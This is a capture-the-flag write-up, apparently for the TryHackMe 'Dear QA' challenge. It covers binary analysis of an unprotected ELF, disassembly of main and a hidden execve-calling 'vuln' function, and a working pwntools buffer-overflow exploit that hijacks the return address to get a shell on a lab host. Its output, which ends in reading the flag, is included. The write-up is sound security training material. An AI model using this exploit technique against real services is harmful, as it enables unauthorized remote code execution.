# DEAR QA

#### Information Given

Download the binary by clicking the Download Task Files button.

Analyze the binary offline.

There's a service running on port 5700. Start the machine using the green button on this task.

## Step 1

Analyze the binary security and information

```
arch     x86                                                                                                                                                                                                                                                                         
baddr    0x400000                                                                                                                                                                                                                                                                    
binsz    5791                                                                                                                                                                                                                                                                        
bintype  elf                                                                                                                                                                                                                                                                         
bits     64                                                                                                                                                                                                                                                                          
canary   false                                                                                                                                                                                                                                                                       
injprot  false                                                                                                                                                                                                                                                                       
class    ELF64                                                                                                                                                                                                                                                                       
compiler GCC: (Debian 4.9.2-10+deb8u2) 4.9.2 GCC: (Debian 4.8.4-1) 4.8.4                                                                                                                                                                                                             
crypto   false                                                                                                                                                                                                                                                                       
endian   little                                                                                                                                                                                                                                                                      
havecode true                                                                                                                                                                                                                                                                        
intrp    /lib64/ld-linux-x86-64.so.2                                                                                                                                                                                                                                                 
laddr    0x0                                                                                                                                                                                                                                                                         
lang     c                                                                                                                                                                                                                                                                           
linenum  true                                                                                                                                                                                                                                                                        
lsyms    true                                                                                                                                                                                                                                                                        
machine  AMD x86-64 architecture                                                                                                                                                                                                                                                     
nx       false
os       linux
pic      false
relocs   true
relro    no
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

The binary has no security

## Step 2

Dry run

```sh
ghostkey :: pocs/thm/dear_qa ‹master*› » ./DearQA.DearQA
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: asdf
Hello: asdf
```


## Step 3

Dump the funcs

```
0x00000000004004f0  _init
0x0000000000400520  puts@plt
0x0000000000400530  printf@plt
0x0000000000400540  __libc_start_main@plt
0x0000000000400550  execve@plt
0x0000000000400560  __gmon_start__@plt
0x0000000000400570  fflush@plt
0x0000000000400580  __isoc99_scanf@plt
0x0000000000400590  _start
0x00000000004005c0  deregister_tm_clones
0x0000000000400600  register_tm_clones
0x0000000000400640  __do_global_dtors_aux
0x0000000000400660  frame_dummy
0x0000000000400686  vuln
0x00000000004006c3  main
0x0000000000400730  __libc_csu_init
0x00000000004007a0  __libc_csu_fini
0x00000000004007a4  _fini
```

We have a main function. But we also have a vuln function

## Step 4

Disassemble the funcs

main

```
0x00000000004006c3 <+0>:     push   %rbp
0x00000000004006c4 <+1>:     mov    %rsp,%rbp
0x00000000004006c7 <+4>:     sub    $0x20,%rsp
0x00000000004006cb <+8>:     mov    $0x400803,%edi
0x00000000004006d0 <+13>:    call   0x400520 <puts@plt>
0x00000000004006d5 <+18>:    mov    $0x400818,%edi
0x00000000004006da <+23>:    call   0x400520 <puts@plt>
0x00000000004006df <+28>:    mov    $0x40083e,%edi
0x00000000004006e4 <+33>:    mov    $0x0,%eax
0x00000000004006e9 <+38>:    call   0x400530 <printf@plt>
0x00000000004006ee <+43>:    mov    0x20051b(%rip),%rax        # 0x600c10 <stdout@@GLIBC_2.2.5>
0x00000000004006f5 <+50>:    mov    %rax,%rdi
0x00000000004006f8 <+53>:    call   0x400570 <fflush@plt>
0x00000000004006fd <+58>:    lea    -0x20(%rbp),%rax
0x0000000000400701 <+62>:    mov    %rax,%rsi
0x0000000000400704 <+65>:    mov    $0x400851,%edi
0x0000000000400709 <+70>:    mov    $0x0,%eax
0x000000000040070e <+75>:    call   0x400580 <__isoc99_scanf@plt>
0x0000000000400713 <+80>:    lea    -0x20(%rbp),%rax
0x0000000000400717 <+84>:    mov    %rax,%rsi
0x000000000040071a <+87>:    mov    $0x400854,%edi
0x000000000040071f <+92>:    mov    $0x0,%eax
0x0000000000400724 <+97>:    call   0x400530 <printf@plt>
0x0000000000400729 <+102>:   mov    $0x0,%eax
0x000000000040072e <+107>:   leave
0x000000000040072f <+108>:   ret
```

vuln

```
0x0000000000400686 <+0>:     push   %rbp
0x0000000000400687 <+1>:     mov    %rsp,%rbp
0x000000000040068a <+4>:     mov    $0x4007b8,%edi
0x000000000040068f <+9>:     call   0x400520 <puts@plt>
0x0000000000400694 <+14>:    mov    $0x4007d0,%edi
0x0000000000400699 <+19>:    call   0x400520 <puts@plt>
0x000000000040069e <+24>:    mov    0x20056b(%rip),%rax        # 0x600c10 <stdout@@GLIBC_2.2.5>
0x00000000004006a5 <+31>:    mov    %rax,%rdi
0x00000000004006a8 <+34>:    call   0x400570 <fflush@plt>
0x00000000004006ad <+39>:    mov    $0x0,%edx
0x00000000004006b2 <+44>:    mov    $0x0,%esi
0x00000000004006b7 <+49>:    mov    $0x4007f9,%edi
0x00000000004006bc <+54>:    call   0x400550 <execve@plt>
0x00000000004006c1 <+59>:    pop    %rbp
0x00000000004006c2 <+60>:    ret
```
There is a 0x20 buffer

```
0x00000000004006c7 <+4>:     sub    $0x20,%rsp
```

After that, theres a call to scanf function

```
0x000000000040070e <+75>:    call   0x400580 <__isoc99_scanf@plt>
```

## Exploit
First off, when deving this exploit it seems that the output data stream was not being printed to the screen so I had the exploit send the 'cat flag.txt' command and then receive everything for 5 seconds (idk sometimes it's slow). But when popping a shell you should be able to interact with it normally

```python
import pwn

payload = b'A' * (0x20 + 0x8)
payload += pwn.p64(0x0000000000400686)

p = pwn.remote("10.10.73.163", 5700)
p.recv()
pwn.log.info("Sending payload")
p.sendline(payload)
p.recvline()
p.sendline(b'cat flag.txt')
stuff = p.recvall(timeout=5)
p.close()
print(stuff)
```

- Set the payload so that it sends 0x20 to overflow the buffer then send 0x8 to overwrite %rbp
- Add the packed address of the vuln function to the end of the payload to hijack flow

```sh
(.venv) ghostkey :: pocs/thm/dear_qa ‹master*› » python exploit.py 
[+] Opening connection to 10.10.73.163 on port 5700: Done
[*] Sending payload
[+] Receiving all data: Done (421B)
[*] Closed connection to 10.10.73.163 port 5700
b"I am sysadmin, i am new in developing\r\nWhat's your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86^F@^@^@^@^@^@\r\nHello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x06@\r\nCongratulations!\r\nYou have entered in the secret function!\r\nbash: cannot set terminal process group (448): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nctf@dearqa:/home/ctf$ cat flag.txt\r\nTHM{REDACTED}\r\nctf@dearqa:/home/ctf$ "
```
